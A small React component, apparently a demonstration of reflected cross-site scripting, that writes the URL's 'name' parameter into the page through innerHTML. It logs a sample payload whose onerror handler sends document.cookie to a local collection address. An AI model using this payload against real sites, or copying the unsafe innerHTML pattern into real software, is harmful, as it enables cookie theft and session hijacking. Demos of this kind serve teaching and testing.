import { useEffect } from "react";

const XSS = () => {
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const name = params.get("name");
    document.getElementById("username").innerHTML = name;
    console.log(
      "raw",
      " ?name=<img src=\"does-not-exist\" onerror=\"var img=document.createElement('img');img.src=`http://127.0.0.1:5501/cookie?data=${document.cookie}`;document.querySelector('body').appendChild(img);\">"
    );
    console.log(
      "encoded URI",
      `?name=%3Cimg%20src=%22does-not-exist%22%20onerror=%22var%20img=document.createElement('img');img.src=%60http://127.0.0.1:5501/cookie?data=$%7Bdocument.cookie%7D%60;document.querySelector('body').appendChild(img);%22%3E`
    );
  }, []);
  return (
    <div>
      <div>
        Welcome, <span id="username"></span>!
      </div>
    </div>
  );
};
export default XSS;
